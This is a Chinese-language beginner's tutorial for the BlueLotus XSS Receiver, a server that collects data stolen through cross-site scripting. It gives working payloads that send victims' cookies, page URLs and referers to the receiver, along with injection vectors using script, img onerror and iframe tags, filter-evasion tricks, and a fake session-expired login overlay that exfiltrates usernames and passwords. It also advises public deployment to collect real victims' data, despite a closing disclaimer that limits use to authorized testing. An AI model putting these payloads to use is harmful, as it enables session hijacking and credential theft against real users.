# XSS 攻击新手完全指南

> 本指南专为网络安全初学者编写,即使你完全不懂 XSS 攻击也能看懂并使用本项目。

## 目录

1. [什么是 XSS 攻击?](#什么是-xss-攻击)
2. [为什么需要 XSS Receiver?](#为什么需要-xss-receiver)
3. [工具安装教程](#工具安装教程)
4. [第一次使用](#第一次使用)
5. [实战演示](#实战演示)
6. [常见问题](#常见问题)

---

## 什么是 XSS 攻击?

### 简单理解

想象你在一个论坛发帖,正常情况下你发的内容会原样显示给其他用户。但如果这个论坛有漏洞,你可以发一段"特殊代码",当别人浏览你的帖子时,这段代码会在他们的浏览器里**自动执行**。

这就是 **XSS (Cross-Site Scripting,跨站脚本攻击)**。

### 举个例子

**正常发帖:**
```
你好,我是新人!
```
其他用户看到的就是这句话。

**XSS 攻击:**
```html
你好,我是新人!<script>alert('你被攻击了!')</script>
```
如果网站有漏洞,其他用户浏览时会弹出警告框,因为 `<script>` 标签里的代码被执行了。

### XSS 能做什么?

攻击者可以通过 XSS:
- 窃取用户的 Cookie (登录凭证)
- 获取用户浏览的页面地址
- 读取用户输入的敏感信息 (密码、信用卡号等)
- 在用户不知情的情况下执行操作 (发帖、转账等)
- 钓鱼攻击 (伪造登录框)

### 三种 XSS 类型

1. **反射型 XSS**: 攻击代码在 URL 里,点击恶意链接就中招
   ```
   http://example.com/search?q=<script>恶意代码</script>
   ```

2. **存储型 XSS**: 攻击代码存在服务器上 (如论坛帖子),所有访问者都会中招

3. **DOM 型 XSS**: 攻击代码通过修改页面 DOM 结构执行

---

## 为什么需要 XSS Receiver?

### 问题场景

假设你在 CTF 比赛或安全测试中发现了一个 XSS 漏洞,你想知道:
- 攻击是否成功执行?
- 受害者的 Cookie 是什么?
- 受害者在哪个页面触发的?
- 受害者的 IP 地址和浏览器信息?

但是,XSS 代码执行在**受害者的浏览器**里,你看不到结果!

### 解决方案

**BlueLotus XSS Receiver** 就像一个"数据收集站":

```
你的 XSS 代码 → 受害者浏览器执行 → 偷偷发送数据到你的服务器 → 你在后台查看
```

### 工作流程图

```
┌─────────────┐
│ 1. 你发现漏洞 │
└──────┬──────┘
       │
       ▼
┌─────────────────────┐
│ 2. 你写 XSS 代码     │
│   (包含你的服务器地址)│
└──────┬──────────────┘
       │
       ▼
┌─────────────────────┐
│ 3. 受害者触发漏洞    │
│   (浏览器执行你的代码)│
└──────┬──────────────┘
       │
       ▼
┌─────────────────────┐
│ 4. 数据发送到你的    │
│    XSS Receiver     │
└──────┬──────────────┘
       │
       ▼
┌─────────────────────┐
│ 5. 你在后台查看数据  │
│   (Cookie、IP 等)   │
└─────────────────────┘
```

---

## 工具安装教程

### 前置要求

你需要先安装这些软件 (如果已安装可跳过):

#### 1. PHP (版本 >= 8.1)

**检查是否已安装:**
```bash
php -v
```

**安装方法:**
- **macOS**: `brew install php`
- **Ubuntu/Debian**: `sudo apt install php8.1 php8.1-sqlite3`
- **Windows**: 下载 [PHP for Windows](https://windows.php.net/download/)

#### 2. Composer (PHP 包管理器)

**检查是否已安装:**
```bash
composer -V
```

**安装方法:**
```bash
# macOS/Linux
curl -sS https://getcomposer.org/installer | php
sudo mv composer.phar /usr/local/bin/composer

# Windows: 下载安装程序
# https://getcomposer.org/Composer-Setup.exe
```

#### 3. Node.js (版本 >= 18)

**检查是否已安装:**
```bash
node -v
npm -v
```

**安装方法:**
- 下载 [Node.js](https://nodejs.org/) 并安装

### 下载项目

```bash
# 克隆项目
git clone https://github.com/firesunCN/BlueLotus_XSSReceiver.git
cd BlueLotus_XSSReceiver
```

### 安装依赖

```bash
# 1. 安装后端依赖
cd backend
composer install

# 2. 安装前端依赖
cd ../frontend
npm install
```

如果看到类似这样的输出,说明安装成功:
```
✔ All dependencies installed successfully
```

---

## 第一次使用

### 启动服务

打开**两个**终端窗口:

**终端 1 - 启动后端:**
```bash
cd backend
php -S 0.0.0.0:8080 -t public
```

看到这个说明后端启动成功:
```
PHP 8.1.0 Development Server (http://0.0.0.0:8080) started
```

**终端 2 - 启动前端:**
```bash
cd frontend
npm run dev
```

看到这个说明前端启动成功:
```
  ➜  Local:   http://localhost:5173/
```

### 登录后台

1. 打开浏览器,访问 http://localhost:5173
2. 输入默认账号:
   - 用户名: `admin`
   - 密码: `bluelotus`
3. 点击"登录"

### 后台界面介绍

登录后你会看到三个标签页:

#### 1. XSS 记录
- 显示所有收到的 XSS 数据
- 包括 IP、地址、浏览器、时间等
- 点击某条记录可以查看详细信息

#### 2. JS 管理
- 管理你的 XSS 攻击代码
- 左侧是脚本列表,右侧是代码编辑器
- 可以创建、编辑、删除脚本

#### 3. 编码工具
- 提供各种编码/解码功能
- Base64、URL、Unicode、HTML 等
- 用于绕过 XSS 过滤

---

## 实战演示

### 场景: 测试一个有 XSS 漏洞的网站

假设你发现 `http://vulnerable-site.com/search` 有 XSS 漏洞。

### 步骤 1: 创建 XSS 脚本

1. 在后台点击"JS 管理"标签
2. 点击"新建脚本"
3. 填写信息:
   - **脚本名称**: `my_first_xss`
   - **描述**: 我的第一个 XSS 测试
   - **代码**: 复制下面的代码

```javascript
// 这段代码会偷偷发送数据到你的服务器
(function() {
    // 你的 XSS Receiver 地址 (改成你自己的!)
    var server = "http://localhost:8080";

    // 收集受害者的信息
    var data = {
        // 当前页面地址
        location: document.location.href,
        // Cookie (可能包含登录凭证)
        cookie: document.cookie,
        // 来源页面
        referer: document.referrer,
        // 浏览器信息
        userAgent: navigator.userAgent
    };

    // 发送到你的服务器
    var img = new Image();
    img.src = server + "/r?" +
        "location=" + encodeURIComponent(data.location) +
        "&cookie=" + encodeURIComponent(data.cookie) +
        "&referer=" + encodeURIComponent(data.referer);
})();
```

4. 点击"保存"

### 步骤 2: 获取 Payload

1. 保存后,点击"复制 URL"按钮
2. 你会得到类似这样的代码:
```html
<script src="http://localhost:8080/js/my_first_xss.js"></script>
```

### 步骤 3: 注入到目标网站

有几种注入方式:

#### 方式 1: 直接注入 (如果网站不过滤)
```html
<script src="http://localhost:8080/js/my_first_xss.js"></script>
```

#### 方式 2: 使用 img 标签
```html
<img src=x onerror="var s=document.createElement('script');s.src='http://localhost:8080/js/my_first_xss.js';document.body.appendChild(s)">
```

#### 方式 3: 使用 iframe
```html
<iframe src="javascript:var s=document.createElement('script');s.src='http://localhost:8080/js/my_first_xss.js';document.body.appendChild(s)"></iframe>
```

### 步骤 4: 查看结果

1. 当有人访问包含你 XSS 代码的页面时
2. 回到 XSS Receiver 后台
3. 点击"XSS 记录"标签
4. 你会看到新的记录,包含:
   - 受害者 IP 地址
   - 地理位置
   - 浏览器信息
   - Cookie 数据
   - 访问时间

5. 点击记录可以查看完整详情

### 步骤 5: 分析数据

在详情页面,你可以看到:

- **Headers**: HTTP 请求头 (User-Agent、Referer 等)
- **GET**: URL 参数
- **POST**: 表单数据
- **Cookie**: 可能包含 session_id 等敏感信息

---

## 常见问题

### Q1: 为什么我的 XSS 代码没有执行?

**可能原因:**
1. 目标网站有 XSS 过滤 → 尝试编码绕过
2. 代码语法错误 → 检查代码是否正确
3. 浏览器拦截 → 某些浏览器有 XSS 保护

### Q2: 收不到数据怎么办?

**检查清单:**
1. 后端是否正常运行? (访问 http://localhost:8080/r 应该返回图片)
2. 脚本中的服务器地址是否正确?
3. 目标网站是否阻止跨域请求? (检查浏览器控制台)
4. 防火墙是否拦截?

### Q3: 如何部署到公网?

本地测试只能收集你自己的数据,要收集真实受害者数据需要部署到公网服务器:

1. 购买云服务器 (阿里云、腾讯云等)
2. 安装 Nginx + PHP
3. 按照 README.md 的"生产部署"章节配置
4. 修改脚本中的服务器地址为你的域名

### Q4: 如何绕过 XSS 过滤?

常见绕过技巧:

1. **大小写混淆**:
```html
<ScRiPt>alert(1)</sCrIpT>
```

2. **编码绕过**:
```html
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
```

3. **事件处理器**:
```html
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<svg onload=alert(1)>
```

4. **使用编码工具**:
   - 在后台"编码工具"标签
   - 选择合适的编码方式
   - 复制编码后的代码

### Q5: 这个工具合法吗?

**重要提醒:**

✅ **合法使用场景:**
- CTF 比赛
- 授权的渗透测试
- 自己的网站安全测试
- 学习和研究

❌ **非法使用场景:**
- 未经授权攻击他人网站
- 窃取他人隐私数据
- 任何恶意用途

**本工具仅供学习和合法安全测试使用,请遵守法律法规!**

### Q6: 如何修改默认密码?

1. 登录后台
2. 点击右上角用户头像
3. 选择"修改密码"
4. 输入旧密码和新密码
5. 点击"确认"

### Q7: 数据存储在哪里?

所有数据存储在 SQLite 数据库中:
```
backend/storage/database.sqlite
```

如果想清空所有数据,删除这个文件即可 (下次启动会自动重建)。

### Q8: 如何查看更多内置模板?

1. 点击"JS 管理"标签
2. 切换到"JS 模板"
3. 浏览内置的 10+ 个模板
4. 点击模板名称查看代码
5. 可以复制到"我的 JS"进行修改

---

## 进阶技巧

### 技巧 1: 使用 KeepSession

在 URL 中添加 `keepsession=1` 参数,可以让受害者浏览器保持连接:

```javascript
var img = new Image();
img.src = server + "/r?keepsession=1&cookie=" + document.cookie;
```

### 技巧 2: 截图功能

使用内置的"截图"模板,可以获取受害者屏幕截图:

1. 在"JS 模板"中找到"截图"
2. 复制代码到"我的 JS"
3. 修改服务器地址
4. 使用这个脚本

### 技巧 3: 钓鱼攻击

创建假登录框,诱导用户输入密码:

```javascript
var fake_login = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999">' +
    '<div style="margin:100px auto;width:300px;background:white;padding:20px">' +
    '<h2>会话已过期,请重新登录</h2>' +
    '<input type="text" id="fake_user" placeholder="用户名"><br>' +
    '<input type="password" id="fake_pass" placeholder="密码"><br>' +
    '<button onclick="sendFakeLogin()">登录</button>' +
    '</div></div>';

document.body.innerHTML += fake_login;

function sendFakeLogin() {
    var user = document.getElementById('fake_user').value;
    var pass = document.getElementById('fake_pass').value;
    var img = new Image();
    img.src = 'http://localhost:8080/r?user=' + user + '&pass=' + pass;
}
```

### 技巧 4: 自动化测试

使用 curl 测试接收端点是否正常:

```bash
curl "http://localhost:8080/r?test=hello&cookie=session_id=123"
```

然后在后台查看是否收到数据。

---

## 学习资源

### 推荐阅读

1. **OWASP XSS 指南**: https://owasp.org/www-community/attacks/xss/
2. **XSS Filter Evasion Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
3. **PortSwigger XSS 教程**: https://portswigger.net/web-security/cross-site-scripting

### 练习平台

1. **XSS Game**: https://xss-game.appspot.com/
2. **DVWA**: http://www.dvwa.co.uk/
3. **WebGoat**: https://owasp.org/www-project-webgoat/

### CTF 平台

1. **CTFtime**: https://ctftime.org/
2. **Hack The Box**: https://www.hackthebox.com/
3. **PicoCTF**: https://picoctf.org/

---

## 总结

现在你应该已经了解:

✅ 什么是 XSS 攻击
✅ XSS Receiver 的作用
✅ 如何安装和使用工具
✅ 如何创建和部署 XSS Payload
✅ 如何查看和分析收集的数据
✅ 常见问题的解决方法

**记住: 仅在合法授权的场景下使用本工具!**

如果有任何问题,欢迎提交 Issue: https://github.com/firesunCN/BlueLotus_XSSReceiver/issues

---

**祝你学习愉快! 🎓**
